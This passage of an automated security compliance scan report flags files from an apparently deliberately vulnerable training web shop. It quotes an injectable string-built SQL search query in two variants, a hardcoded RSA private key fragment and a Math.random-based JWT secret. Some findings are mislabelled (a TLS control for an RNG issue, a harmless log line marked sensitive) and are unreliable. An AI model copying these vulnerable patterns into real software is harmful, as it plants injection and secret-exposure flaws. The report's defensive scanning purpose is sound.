High-Value Keys", "risk_level": "High"}, {"id": "INPUT-M-001", "title": "Whitelist-Based Input Validation", "risk_level": "High"}, {"id": "INPUT-M-002", "title": "Input Encoding & Output Encoding", "risk_level": "High"}]
-->

---

## SAGF Compliance Scan: `lib/insecurity.ts`
**Scanned at**: 2026-10-11T16:33:25.341052+00:00
**Mandard DB coverage**: 64 applicable mandards checked (SECR, SAST, HDR, CORS, INPUT, INJECT…)
**Attestation**: `eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ0aW1lc3RhbXAiOiA...`

### 🚨 Confirmed Violations (2)
| Sev | Mandard | Title | Line |
|-----|---------|-------|------|
| 🟡 MEDIUM | [CRYPT-M-002](https://verify.example-org.internal/?id=CRYPT-M-002) | Encryption in Transit (TLS 1.3+) | 53 |
| 🔴 CRITICAL | [SECR-M-001](https://verify.example-org.internal/?id=SECR-M-001) | No Hardcoded Secrets | 21 |

#### [CRYPT-M-002](https://verify.example-org.internal/?id=CRYPT-M-002) — Non-cryptographic random number generator detected
```ts
// Line 53
export const denyAll = () => expressJwt({ secret: '' + Math.random() } as any)
```
**Suggested fix:**
```ts
// Suggested fix: use a cryptographically secure RNG
// WRONG:  const token = Math.random().toString(36);
const token = crypto.randomUUID();                          // browser / Node 19+
// or:  const buf = crypto.getRandomValues(new Uint8Array(32));  // raw bytes
# Python:  import secrets; token = secrets.token_urlsafe(32)
```
> 💡 **Why**: Risk: Unencrypted or weakly encrypted data in transit is vulnerable to interception, man-in-the-middle attacks, and eavesdropping on networks.
> 🔧 **Guidance**: Configure TLS 1.3 as minimum. Disable TLS 1.0, 1.1, 1.2. Use modern cipher suites. Disable weak ciphers (RC4, DES, MD5).
> [Full remediation →](https://verify.example-org.internal/?id=CRYPT-M-002)

#### [SECR-M-001](https://verify.example-org.internal/?id=SECR-M-001) — Hardcoded credential in named variable detected
```ts
// Line 21
const privateKey = '-----BEGIN RSA PRIVATE KEY-----\r\nMIICXAIBAAKBgQDNwqLEe9wgTXCbC7+RPdDbBbeqjdbs4kOPOIGzqLpXvJXlxxW8iMz0EaM4BKUqYsIa+ndv3NAn2RxCd5ubVdJJcX43zO6Ko0TFEZx/65gY3BE0O6syCEmUP4qbSd6exo...
```
**Suggested fix:**
```ts
# Suggested fix: load all credentials from environment variables or a vault
import os
JWT_SECRET = os.environ['JWT_SECRET']          # Python
// const jwtSecret = process.env.JWT_SECRET;   // Node.js
# Use Azure Key Vault / AWS Secrets Manager / HashiCorp Vault in production
```
> 💡 **Why**: Risk: Hardcoding secrets is one of the most common ways attackers gain unauthorized access to cloud resources. This control eliminates credential exposure in the repository.
> 🔧 **Guidance**: A developer must remove the secret from code, invalidate the token, and store it in an approved secret vault (e.g., Azure Key Vault or HashiCorp Vault).
> [Full remediation →](https://verify.example-org.internal/?id=SECR-M-001)

### ⚠️ Most Relevant Mandards Requiring Tool Verification
_Ranked by relevance to this code. Static scan did not detect violations — use the SAGF Tier 2 toolchain to verify:_

| Risk | Mandard | Title |
|------|---------|-------|
| 🔴 Critical | [COOK-M-001](https://verify.example-org.internal/?id=COOK-M-001) | Secure Cookie Attributes (HttpOnly, Secure, SameSite) |
| 🟠 High | [INPUT-M-001](https://verify.example-org.internal/?id=INPUT-M-001) | Whitelist-Based Input Validation |
| 🟠 High | [INPUT-M-002](https://verify.example-org.internal/?id=INPUT-M-002) | Input Encoding & Output Encoding |
| 🔴 Critical | [AUTH-M-001](https://verify.example-org.internal/?id=AUTH-M-001) | Secure Password Hashing |
| 🔴 Critical | [CRYPT-M-001](https://verify.example-org.internal/?id=CRYPT-M-001) | Encryption at Rest |
| 🔴 Critical | [HDR-M-001](https://verify.example-org.internal/?id=HDR-M-001) | Enforce X-Content-Type-Options |
| 🔴 Critical | [HDR-M-005](https://verify.example-org.internal/?id=HDR-M-005) | Disable Legacy X-XSS-Protection Filter |
| 🔴 Critical | [IDOR-M-004](https://verify.example-org.internal/?id=IDOR-M-004) | Context-Aware Data Queries |

_+ 54 more applicable mandards — [view all 62 in SAGF UI →](https://verify.example-org.internal/)_

> Run SonarQube, Snyk, Semgrep, and other SAGF Tier 2 tools for comprehensive coverage per SAGF-STD-004.

<!-- CODI_FINDINGS_JSON
[{"mandard_id": "CRYPT-M-002", "severity": "MEDIUM", "line": 53, "message": "Non-cryptographic random number generator detected", "fix_snippet": "// Suggested fix: use a cryptographically secure RNG\n// WRONG:  const token = Math.random().toString(36);\nconst token = crypto.randomUUID();                          // browser / Node 19+\n// or:  const buf = crypto.getRandomValues(new Uint8Array(32));  // raw bytes\n# Python:  import secrets; token = secrets.token_urlsafe(32)"}, {"mandard_id": "SECR-M-001", "severity": "CRITICAL", "line": 21, "message": "Hardcoded credential in named variable detected", "fix_snippet": "# Suggested fix: load all credentials from environment variables or a vault\nimport os\nJWT_SECRET = os.environ['JWT_SECRET']          # Python\n// const jwtSecret = process.env.JWT_SECRET;   // Node.js\n# Use Azure Key Vault / AWS Secrets Manager / HashiCorp Vault in production"}]
-->

<!-- CODI_ADVISORY_JSON
[{"id": "COOK-M-001", "title": "Secure Cookie Attributes (HttpOnly, Secure, SameSite)", "risk_level": "Critical"}, {"id": "INPUT-M-001", "title": "Whitelist-Based Input Validation", "risk_level": "High"}, {"id": "INPUT-M-002", "title": "Input Encoding & Output Encoding", "risk_level": "High"}, {"id": "AUTH-M-001", "title": "Secure Password Hashing", "risk_level": "Critical"}, {"id": "CRYPT-M-001", "title": "Encryption at Rest", "risk_level": "Critical"}, {"id": "HDR-M-001", "title": "Enforce X-Content-Type-Options", "risk_level": "Critical"}, {"id": "HDR-M-005", "title": "Disable Legacy X-XSS-Protection Filter", "risk_level": "Critical"}, {"id": "IDOR-M-004", "title": "Context-Aware Data Queries", "risk_level": "Critical"}, {"id": "SECR-M-002", "title": "Prevent Secret Exposure in CI/CD Logs and History", "risk_level": "Critical"}, {"id": "AUTH-M-004", "title": "Password Reset & Account Recovery", "risk_level": "High"}, {"id": "CRYPT-M-004", "title": "Algorithm Selection & Post-Quantum Readiness", "risk_level": "High"}, {"id": "CRYPT-M-006", "title": "Hardware Security Module (HSM) for High-Value Keys", "risk_level": "High"}, {"id": "HDR-M-006", "title": "Enforce Content-Type and Charset", "risk_level": "High"}, {"id": "HDR-M-009", "title": "Cache-Control for Sensitive Data", "risk_level": "High"}, {"id": "SAST-M-002", "title": "Secure File Upload Validation", "risk_level": "Critical"}, {"id": "DEP-M-002", "title": "Package Manager Lifecycle Script Hardening", "risk_level": "High"}, {"id": "DEP-M-003", "title": "Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion)", "risk_level": "High"}, {"id": "AUTH-M-002", "title": "Multi-Factor Authentication (MFA) Enforcement", "risk_level": "Critical"}, {"id": "HDR-M-002", "title": "No Server Banners", "risk_level": "Critical"}, {"id": "HDR-M-003", "title": "Enforce HSTS", "risk_level": "Critical"}, {"id": "HDR-M-007", "title": "Enforce Referrer Policy", "risk_level": "Critical"}, {"id": "HDR-M-008", "title": "Enforce Permissions Policy", "risk_level": "Critical"}, {"id": "HDR-M-011", "title": "Cross-Origin-Resource-Policy (CORP)", "risk_level": "Critical"}, {"id": "HDR-M-012", "title": "Cross-Origin-Embedder-Policy (COEP)", "risk_level": "Critical"}, {"id": "HDR-M-014", "title": "Content Security Policy CSP", "risk_level": "Critical"}, {"id": "IDOR-M-001", "title": "IDOR Protection", "risk_level": "Critical"}, {"id": "SECR-M-004", "title": "Short-Lived Credentials & Rotation", "risk_level": "Critical"}, {"id": "SECR-M-005", "title": "No Secrets in Build Logs", "risk_level": "Critical"}, {"id": "AUTH-M-003", "title": "Session Management & Timeout Controls", "risk_level": "High"}, {"id": "COOK-M-002", "title": "Cookie Theft Prevention & Rotation", "risk_level": "High"}, {"id": "CRYPT-M-003", "title": "Key Rotation & Lifecycle Management", "risk_level": "High"}, {"id": "CRYPT-M-005", "title": "Certificate Management & Pinning", "risk_level": "High"}, {"id": "IDOR-M-002", "title": "Opaque Object Identifiers", "risk_level": "High"}, {"id": "IDOR-M-003", "title": "Avoid Exposing IDs in URLs", "risk_level": "High"}, {"id": "IDOR-M-005", "title": "IDOR Test Coverage Matrix", "risk_level": "High"}, {"id": "IDOR-M-006", "title": "Log Authorization Failures", "risk_level": "High"}, {"id": "IDOR-M-007", "title": "Validate Nested Resource Ownership", "risk_level": "High"}, {"id": "SECR-M-003", "title": "Enforce Temporary Credentials and Credential Rotation in CI/CD", "risk_level": "High"}, {"id": "AJAX-M-002", "title": "AJAX Response Sanitization & XSS Prevention", "risk_level": "Critical"}, {"id": "DEP-M-001", "title": "Pin Dependency Versions in Production Builds", "risk_level": "Critical"}, {"id": "SAST-M-006", "title": "Native Memory Safety and Unsafe Code Assurance", "risk_level": "Critical"}, {"id": "AJAX-M-001", "title": "AJAX Request Validation & CSRF Protection", "risk_level": "High"}, {"id": "INJECT-M-002", "title": "OS Command Injection Prevention", "risk_level": "Critical"}, {"id": "INJECT-M-003", "title": "XML External Entity (XXE) Prevention", "risk_level": "Critical"}, {"id": "SAST-M-001", "title": "No Critical SAST Findings", "risk_level": "Critical"}, {"id": "SAST-M-003", "title": "Disable XXE Processing", "risk_level": "Critical"}, {"id": "SAST-M-004", "title": "Prevent Insecure Deserialization", "risk_level": "Critical"}, {"id": "SAST-M-005", "title": "Prevent Mass Assignment", "risk_level": "Critical"}, {"id": "CORS-M-001", "title": "No Reflected Origin (CORS)", "risk_level": "High"}, {"id": "INJECT-M-001", "title": "LDAP Injection Prevention", "risk_level": "High"}, {"id": "LOG-M-001", "title": "Stream Logs to SIEM", "risk_level": "High"}, {"id": "LOG-M-002", "title": "Implement Comprehensive CI/CD Audit Logging", "risk_level": "High"}, {"id": "LOG-M-003", "title": "Configure Centralized Log Aggregation and SIEM Alerting for CI/CD", "risk_level": "High"}, {"id": "LOG-M-004", "title": "Trusted Time Synchronization for Security Events", "risk_level": "High"}]
-->

---

## SAGF Compliance Scan: `frontend/src/hacking-instructor/helpers/helpers.ts`
**Scanned at**: 2026-10-11T16:33:28.798140+00:00
**Mandard DB coverage**: 64 applicable mandards checked (SECR, SAST, HDR, CORS, INPUT, INJECT…)
**Attestation**: `eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ0aW1lc3RhbXAiOiA...`

### 🚨 Confirmed Violations (1)
| Sev | Mandard | Title | Line |
|-----|---------|-------|------|
| 🟠 HIGH | [LOG-M-001](https://verify.example-org.internal/?id=LOG-M-001) | Stream Logs to SIEM | 191 |

#### [LOG-M-001](https://verify.example-org.internal/?id=LOG-M-001) — Sensitive data logged to console
```ts
// Line 191
console.log('Role from token could not be accessed.')
```
**Suggested fix:**
```ts
// Suggested fix: never log credentials — log a masked reference instead
// WRONG:  console.log('Auth', password, apiKey);
const logger = require('./logger');  // structured logger (e.g. winston, pino)
logger.info('Auth attempt', { userId, tokenPresent: !!apiKey });  // mask value
```
> 💡 **Why**: Risk: Without centralized logging, it is impossible to perform effective incident response. If an attacker breaches an application, the logs on the compromised server will be the first thing they delete.
> 🔧 **Guidance**: Mask or redact secrets in CI output, avoid echoing environment variables, and configure log retention/access controls. Invalidate any secret discovered in logs.
> [Full remediation →](https://verify.example-org.internal/?id=LOG-M-001)

### ⚠️ Most Relevant Mandards Requiring Tool Verification
_Ranked by relevance to this code. Static scan did not detect violations — use the SAGF Tier 2 toolchain to verify:_

| Risk | Mandard | Title |
|------|---------|-------|
| 🔴 Critical | [IDOR-M-004](https://verify.example-org.internal/?id=IDOR-M-004) | Context-Aware Data Queries |
| 🟠 High | [AUTH-M-003](https://verify.example-org.internal/?id=AUTH-M-003) | Session Management & Timeout Controls |
| 🟠 High | [INPUT-M-001](https://verify.example-org.internal/?id=INPUT-M-001) | Whitelist-Based Input Validation |
| 🟠 High | [INPUT-M-002](https://verify.example-org.internal/?id=INPUT-M-002) | Input Encoding & Output Encoding |
| 🟠 High | [LOG-M-004](https://verify.example-org.internal/?id=LOG-M-004) | Trusted Time Synchronization for Security Events |
| 🔴 Critical | [AUTH-M-001](https://verify.example-org.internal/?id=AUTH-M-001) | Secure Password Hashing |
| 🔴 Critical | [AUTH-M-002](https://verify.example-org.internal/?id=AUTH-M-002) | Multi-Factor Authentication (MFA) Enforcement |
| 🔴 Critical | [CRYPT-M-001](https://verify.example-org.internal/?id=CRYPT-M-001) | Encryption at Rest |

_+ 55 more applicable mandards — [view all 63 in SAGF UI →](https://verify.example-org.internal/)_

> Run SonarQube, Snyk, Semgrep, and other SAGF Tier 2 tools for comprehensive coverage per SAGF-STD-004.

<!-- CODI_FINDINGS_JSON
[{"mandard_id": "LOG-M-001", "severity": "HIGH", "line": 191, "message": "Sensitive data logged to console", "fix_snippet": "// Suggested fix: never log credentials \u2014 log a masked reference instead\n// WRONG:  console.log('Auth', password, apiKey);\nconst logger = require('./logger');  // structured logger (e.g. winston, pino)\nlogger.info('Auth attempt', { userId, tokenPresent: !!apiKey });  // mask value"}]
-->

<!-- CODI_ADVISORY_JSON
[{"id": "IDOR-M-004", "title": "Context-Aware Data Queries", "risk_level": "Critical"}, {"id": "AUTH-M-003", "title": "Session Management & Timeout Controls", "risk_level": "High"}, {"id": "INPUT-M-001", "title": "Whitelist-Based Input Validation", "risk_level": "High"}, {"id": "INPUT-M-002", "title": "Input Encoding & Output Encoding", "risk_level": "High"}, {"id": "LOG-M-004", "title": "Trusted Time Synchronization for Security Events", "risk_level": "High"}, {"id": "AUTH-M-001", "title": "Secure Password Hashing", "risk_level": "Critical"}, {"id": "AUTH-M-002", "title": "Multi-Factor Authentication (MFA) Enforcement", "risk_level": "Critical"}, {"id": "CRYPT-M-001", "title": "Encryption at Rest", "risk_level": "Critical"}, {"id": "IDOR-M-001", "title": "IDOR Protection", "risk_level": "Critical"}, {"id": "INJECT-M-002", "title": "OS Command Injection Prevention", "risk_level": "Critical"}, {"id": "INJECT-M-003", "title": "XML External Entity (XXE) Prevention", "risk_level": "Critical"}, {"id": "AUTH-M-004", "title": "Password Reset & Account Recovery", "risk_level": "High"}, {"id": "CRYPT-M-006", "title": "Hardware Security Module (HSM) for High-Value Keys", "risk_level": "High"}, {"id": "DEP-M-003", "title": "Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion)", "risk_level": "High"}, {"id": "IDOR-M-002", "title": "Opaque Object Identifiers", "risk_level": "High"}, {"id": "IDOR-M-003", "title": "Avoid Exposing IDs in URLs", "risk_level": "High"}, {"id": "IDOR-M-005", "title": "IDOR Test Coverage Matrix", "risk_level": "High"}, {"id": "IDOR-M-006", "title": "Log Authorization Failures", "risk_level": "High"}, {"id": "IDOR-M-007", "title": "Validate Nested Resource Ownership", "risk_level": "High"}, {"id": "INJECT-M-001", "title": "LDAP Injection Prevention", "risk_level": "High"}, {"id": "HDR-M-001", "title": "Enforce X-Content-Type-Options", "risk_level": "Critical"}, {"id": "SAST-M-006", "title": "Native Memory Safety and Unsafe Code Assurance", "risk_level": "Critical"}, {"id": "SECR-M-001", "title": "No Hardcoded Secrets", "risk_level": "Critical"}, {"id": "SECR-M-002", "title": "Prevent Secret Exposure in CI/CD Logs and History", "risk_level": "Critical"}, {"id": "SECR-M-004", "title": "Short-Lived Credentials & Rotation", "risk_level": "Critical"}, {"id": "SECR-M-005", "title": "No Secrets in Build Logs", "risk_level": "Critical"}, {"id": "HDR-M-009", "title": "Cache-Control for Sensitive Data", "risk_level": "High"}, {"id": "LOG-M-002", "title": "Implement Comprehensive CI/CD Audit Logging", "risk_level": "High"}, {"id": "LOG-M-003", "title": "Configure Centralized Log Aggregation and SIEM Alerting for CI/CD", "risk_level": "High"}, {"id": "SECR-M-003", "title": "Enforce Temporary Credentials and Credential Rotation in CI/CD", "risk_level": "High"}, {"id": "CRYPT-M-002", "title": "Encryption in Transit (TLS 1.3+)", "risk_level": "Critical"}, {"id": "DEP-M-001", "title": "Pin Dependency Versions in Production Builds", "risk_level": "Critical"}, {"id": "CRYPT-M-003", "title": "Key Rotation & Lifecycle Management", "risk_level": "High"}, {"id": "CRYPT-M-004", "title": "Algorithm Selection & Post-Quantum Readiness", "risk_level": "High"}, {"id": "CRYPT-M-005", "title": "Certificate Management & Pinning", "risk_level": "High"}, {"id": "DEP-M-002", "title": "Package Manager Lifecycle Script Hardening", "risk_level": "High"}, {"id": "AJAX-M-002", "title": "AJAX Response Sanitization & XSS Prevention", "risk_level": "Critical"}, {"id": "COOK-M-001", "title": "Secure Cookie Attributes (HttpOnly, Secure, SameSite)", "risk_level": "Critical"}, {"id": "HDR-M-002", "title": "No Server Banners", "risk_level": "Critical"}, {"id": "HDR-M-003", "title": "Enforce HSTS", "risk_level": "Critical"}, {"id": "HDR-M-005", "title": "Disable Legacy X-XSS-Protection Filter", "risk_level": "Critical"}, {"id": "HDR-M-007", "title": "Enforce Referrer Policy", "risk_level": "Critical"}, {"id": "HDR-M-008", "title": "Enforce Permissions Policy", "risk_level": "Critical"}, {"id": "HDR-M-011", "title": "Cross-Origin-Resource-Policy (CORP)", "risk_level": "Critical"}, {"id": "HDR-M-012", "title": "Cross-Origin-Embedder-Policy (COEP)", "risk_level": "Critical"}, {"id": "HDR-M-014", "title": "Content Security Policy CSP", "risk_level": "Critical"}, {"id": "SAST-M-001", "title": "No Critical SAST Findings", "risk_level": "Critical"}, {"id": "SAST-M-002", "title": "Secure File Upload Validation", "risk_level": "Critical"}, {"id": "SAST-M-003", "title": "Disable XXE Processing", "risk_level": "Critical"}, {"id": "SAST-M-004", "title": "Prevent Insecure Deserialization", "risk_level": "Critical"}, {"id": "SAST-M-005", "title": "Prevent Mass Assignment", "risk_level": "Critical"}, {"id": "AJAX-M-001", "title": "AJAX Request Validation & CSRF Protection", "risk_level": "High"}, {"id": "COOK-M-002", "title": "Cookie Theft Prevention & Rotation", "risk_level": "High"}, {"id": "CORS-M-001", "title": "No Reflected Origin (CORS)", "risk_level": "High"}, {"id": "HDR-M-006", "title": "Enforce Content-Type and Charset", "risk_level": "High"}]
-->

---

## SAGF Compliance Scan: `data/static/codefixes/dbSchemaChallenge_3.ts`
**Scanned at**: 2026-10-11T16:33:31.145028+00:00
**Mandard DB coverage**: 64 applicable mandards checked (SECR, SAST, HDR, CORS, INPUT, INJECT…)
**Attestation**: `eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ0aW1lc3RhbXAiOiA...`

### 🚨 Confirmed Violations (1)
| Sev | Mandard | Title | Line |
|-----|---------|-------|------|
| 🔴 CRITICAL | [DB-M-001](https://verify.example-org.internal/?id=DB-M-001) | SQL query built by string interpolation or concatenation | 11 |

#### [DB-M-001](https://verify.example-org.internal/?id=DB-M-001) — SQL query built by string interpolation or concatenation
```ts
// Line 11
models.sequelize.query(`SELECT * FROM Products WHERE ((name LIKE '%${criteria}%' OR description LIKE '%${criteria}%') AND deletedAt IS NULL) ORDER BY name`)
```
**Suggested fix:**
```ts
# Suggested fix: always use parameterised queries
# WRONG (PHP):  $q = "SELECT * FROM users WHERE id = '$id'";
# WRONG (Py):   query = 'SELECT * FROM users WHERE id = ' + user_id
# Python (psycopg2 / sqlite3):
cursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))
# PHP (PDO):  $s = $pdo->prepare('SELECT * FROM users WHERE id = ?'); $s->execute([$id]);
# Node.js (pg):  pool.query('SELECT * FROM users WHERE id = $1', [userId])
# Java:  PreparedStatement ps = conn.prepareStatement('SELECT * FROM users WHERE id = ?');
#        ps.setInt(1, userId);
```

### ⚠️ Most Relevant Mandards Requiring Tool Verification
_Ranked by relevance to this code. Static scan did not detect violations — use the SAGF Tier 2 toolchain to verify:_

| Risk | Mandard | Title |
|------|---------|-------|
| 🔴 Critical | [INJECT-M-002](https://verify.example-org.internal/?id=INJECT-M-002) | OS Command Injection Prevention |
| 🟠 High | [INJECT-M-001](https://verify.example-org.internal/?id=INJECT-M-001) | LDAP Injection Prevention |
| 🟠 High | [DEP-M-002](https://verify.example-org.internal/?id=DEP-M-002) | Package Manager Lifecycle Script Hardening |
| 🟠 High | [DEP-M-003](https://verify.example-org.internal/?id=DEP-M-003) | Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion) |
| 🟠 High | [HDR-M-009](https://verify.example-org.internal/?id=HDR-M-009) | Cache-Control for Sensitive Data |
| 🔴 Critical | [AJAX-M-002](https://verify.example-org.internal/?id=AJAX-M-002) | AJAX Response Sanitization & XSS Prevention |
| 🔴 Critical | [IDOR-M-004](https://verify.example-org.internal/?id=IDOR-M-004) | Context-Aware Data Queries |
| 🔴 Critical | [INJECT-M-003](https://verify.example-org.internal/?id=INJECT-M-003) | XML External Entity (XXE) Prevention |

_+ 56 more applicable mandards — [view all 64 in SAGF UI →](https://verify.example-org.internal/)_

> Run SonarQube, Snyk, Semgrep, and other SAGF Tier 2 tools for comprehensive coverage per SAGF-STD-004.

<!-- CODI_FINDINGS_JSON
[{"mandard_id": "DB-M-001", "severity": "CRITICAL", "line": 11, "message": "SQL query built by string interpolation or concatenation", "fix_snippet": "# Suggested fix: always use parameterised queries\n# WRONG (PHP):  $q = \"SELECT * FROM users WHERE id = '$id'\";\n# WRONG (Py):   query = 'SELECT * FROM users WHERE id = ' + user_id\n# Python (psycopg2 / sqlite3):\ncursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))\n# PHP (PDO):  $s = $pdo->prepare('SELECT * FROM users WHERE id = ?'); $s->execute([$id]);\n# Node.js (pg):  pool.query('SELECT * FROM users WHERE id = $1', [userId])\n# Java:  PreparedStatement ps = conn.prepareStatement('SELECT * FROM users WHERE id = ?');\n#        ps.setInt(1, userId);"}]
-->

<!-- CODI_ADVISORY_JSON
[{"id": "INJECT-M-002", "title": "OS Command Injection Prevention", "risk_level": "Critical"}, {"id": "INJECT-M-001", "title": "LDAP Injection Prevention", "risk_level": "High"}, {"id": "DEP-M-002", "title": "Package Manager Lifecycle Script Hardening", "risk_level": "High"}, {"id": "DEP-M-003", "title": "Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion)", "risk_level": "High"}, {"id": "HDR-M-009", "title": "Cache-Control for Sensitive Data", "risk_level": "High"}, {"id": "AJAX-M-002", "title": "AJAX Response Sanitization & XSS Prevention", "risk_level": "Critical"}, {"id": "IDOR-M-004", "title": "Context-Aware Data Queries", "risk_level": "Critical"}, {"id": "INJECT-M-003", "title": "XML External Entity (XXE) Prevention", "risk_level": "Critical"}, {"id": "AJAX-M-001", "title": "AJAX Request Validation & CSRF Protection", "risk_level": "High"}, {"id": "INPUT-M-001", "title": "Whitelist-Based Input Validation", "risk_level": "High"}, {"id": "INPUT-M-002", "title": "Input Encoding & Output Encoding", "risk_level": "High"}, {"id": "DEP-M-001", "title": "Pin Dependency Versions in Production Builds", "risk_level": "Critical"}, {"id": "HDR-M-001", "title": "Enforce X-Content-Type-Options", "risk_level": "Critical"}, {"id": "HDR-M-002", "title": "No Server Banners", "risk_level": "Critical"}, {"id": "HDR-M-003", "title": "Enforce HSTS", "risk_level": "Critical"}, {"id": "HDR-M-005", "title": "Disable Legacy X-XSS-Protection Filter", "risk_level": "Critical"}, {"id": "HDR-M-007", "title": "Enforce Referrer Policy", "risk_level": "Critical"}, {"id": "HDR-M-008", "title": "Enforce Permissions Policy", "risk_level": "Critical"}, {"id": "HDR-M-011", "title": "Cross-Origin-Resource-Policy (CORP)", "risk_level": "Critical"}, {"id": "HDR-M-012", "title": "Cross-Origin-Embedder-Policy (COEP)", "risk_level": "Critical"}, {"id": "HDR-M-014", "title": "Content Security Policy CSP", "risk_level": "Critical"}, {"id": "HDR-M-006", "title": "Enforce Content-Type and Charset", "risk_level": "High"}, {"id": "AUTH-M-001", "title": "Secure Password Hashing", "risk_level": "Critical"}, {"id": "AUTH-M-002", "title": "Multi-Factor Authentication (MFA) Enforcement", "risk_level": "Critical"}, {"id": "COOK-M-001", "title": "Secure Cookie Attributes (HttpOnly, Secure, SameSite)", "risk_level": "Critical"}, {"id": "CRYPT-M-001", "title": "Encryption at Rest", "risk_level": "Critical"}, {"id": "CRYPT-M-002", "title": "Encryption in Transit (TLS 1.3+)", "risk_level": "Critical"}, {"id": "IDOR-M-001", "title": "IDOR Protection", "risk_level": "Critical"}, {"id": "SAST-M-001", "title": "No Critical SAST Findings", "risk_level": "Critical"}, {"id": "SAST-M-002", "title": "Secure File Upload Validation", "risk_level": "Critical"}, {"id": "SAST-M-003", "title": "Disable XXE Processing", "risk_level": "Critical"}, {"id": "SAST-M-004", "title": "Prevent Insecure Deserialization", "risk_level": "Critical"}, {"id": "SAST-M-005", "title": "Prevent Mass Assignment", "risk_level": "Critical"}, {"id": "SAST-M-006", "title": "Native Memory Safety and Unsafe Code Assurance", "risk_level": "Critical"}, {"id": "SECR-M-001", "title": "No Hardcoded Secrets", "risk_level": "Critical"}, {"id": "SECR-M-002", "title": "Prevent Secret Exposure in CI/CD Logs and History", "risk_level": "Critical"}, {"id": "SECR-M-004", "title": "Short-Lived Credentials & Rotation", "risk_level": "Critical"}, {"id": "SECR-M-005", "title": "No Secrets in Build Logs", "risk_level": "Critical"}, {"id": "AUTH-M-003", "title": "Session Management & Timeout Controls", "risk_level": "High"}, {"id": "AUTH-M-004", "title": "Password Reset & Account Recovery", "risk_level": "High"}, {"id": "COOK-M-002", "title": "Cookie Theft Prevention & Rotation", "risk_level": "High"}, {"id": "CORS-M-001", "title": "No Reflected Origin (CORS)", "risk_level": "High"}, {"id": "CRYPT-M-003", "title": "Key Rotation & Lifecycle Management", "risk_level": "High"}, {"id": "CRYPT-M-004", "title": "Algorithm Selection & Post-Quantum Readiness", "risk_level": "High"}, {"id": "CRYPT-M-005", "title": "Certificate Management & Pinning", "risk_level": "High"}, {"id": "CRYPT-M-006", "title": "Hardware Security Module (HSM) for High-Value Keys", "risk_level": "High"}, {"id": "IDOR-M-002", "title": "Opaque Object Identifiers", "risk_level": "High"}, {"id": "IDOR-M-003", "title": "Avoid Exposing IDs in URLs", "risk_level": "High"}, {"id": "IDOR-M-005", "title": "IDOR Test Coverage Matrix", "risk_level": "High"}, {"id": "IDOR-M-006", "title": "Log Authorization Failures", "risk_level": "High"}, {"id": "IDOR-M-007", "title": "Validate Nested Resource Ownership", "risk_level": "High"}, {"id": "LOG-M-001", "title": "Stream Logs to SIEM", "risk_level": "High"}, {"id": "LOG-M-002", "title": "Implement Comprehensive CI/CD Audit Logging", "risk_level": "High"}, {"id": "LOG-M-003", "title": "Configure Centralized Log Aggregation and SIEM Alerting for CI/CD", "risk_level": "High"}, {"id": "LOG-M-004", "title": "Trusted Time Synchronization for Security Events", "risk_level": "High"}, {"id": "SECR-M-003", "title": "Enforce Temporary Credentials and Credential Rotation in CI/CD", "risk_level": "High"}]
-->

---

## SAGF Compliance Scan: `data/static/codefixes/dbSchemaChallenge_1.ts`
**Scanned at**: 2026-10-11T16:33:31.272422+00:00
**Mandard DB coverage**: 64 applicable mandards checked (SECR, SAST, HDR, CORS, INPUT, INJECT…)
**Attestation**: `eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ0aW1lc3RhbXAiOiA...`

### 🚨 Confirmed Violations (1)
| Sev | Mandard | Title | Line |
|-----|---------|-------|------|
| 🔴 CRITICAL | [DB-M-001](https://verify.example-org.internal/?id=DB-M-001) | SQL query built by string interpolation or concatenation | 5 |

#### [DB-M-001](https://verify.example-org.internal/?id=DB-M-001) — SQL query built by string interpolation or concatenation
```ts
// Line 5
models.sequelize.query("SELECT * FROM Products WHERE ((name LIKE '%"+criteria+"%' OR description LIKE '%"+criteria+"%') AND deletedAt IS NULL) ORDER BY name")
```
**Suggested fix:**
```ts
# Suggested fix: always use parameterised queries
# WRONG (PHP):  $q = "SELECT * FROM users WHERE id = '$id'";
# WRONG (Py):   query = 'SELECT * FROM users WHERE id = ' + user_id
# Python (psycopg2 / sqlite3):
cursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))
# PHP (PDO):  $s = $pdo->prepare('SELECT * FROM users WHERE id = ?'); $s->execute([$id]);
# Node.js (pg):  pool.query('SELECT * FROM users WHERE id = $1', [userId])
# Java:  PreparedStatement ps = conn.prepareStatement('SELECT * FROM users WHERE id = ?');
#        ps.setInt(1, userId);
```

### ⚠️ Most Relevant Mandards Requiring Tool Verification
_Ranked by relevance to this code. Static scan did not detect violations — use the SAGF Tier 2 toolchain to verify:_

| Risk | Mandard | Title |
|------|---------|-------|
| 🟠 High | [DEP-M-002](https://verify.example-org.internal/?id=DEP-M-002) | Package Manager Lifecycle Script Hardening |
| 🟠 High | [DEP-M-003](https://verify.example-org.internal/?id=DEP-M-003) | Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion) |
| 🟠 High | [HDR-M-009](https://verify.example-org.internal/?id=HDR-M-009) | Cache-Control for Sensitive Data |
| 🔴 Critical | [AJAX-M-002](https://verify.example-org.internal/?id=AJAX-M-002) | AJAX Response Sanitization & XSS Prevention |
| 🔴 Critical | [IDOR-M-004](https://verify.example-org.internal/?id=IDOR-M-004) | Context-Aware Data Queries |
| 🔴 Critical | [INJECT-M-002](https://verify.example-org.internal/?id=INJECT-M-002) | OS Command Injection Prevention |
| 🔴 Critical | [INJECT-M-003](https://verify.example-org.internal/?id=INJECT-M-003) | XML External Entity (XXE) Prevention |
| 🟠 High | [AJAX-M-001](https://verify.example-org.internal/?id=AJAX-M-001) | AJAX Request Validation & CSRF Protection |

_+ 56 more applicable mandards — [view all 64 in SAGF UI →](https://verify.example-org.internal/)_

> Run SonarQube, Snyk, Semgrep, and other SAGF Tier 2 tools for comprehensive coverage per SAGF-STD-004.

<!-- CODI_FINDINGS_JSON
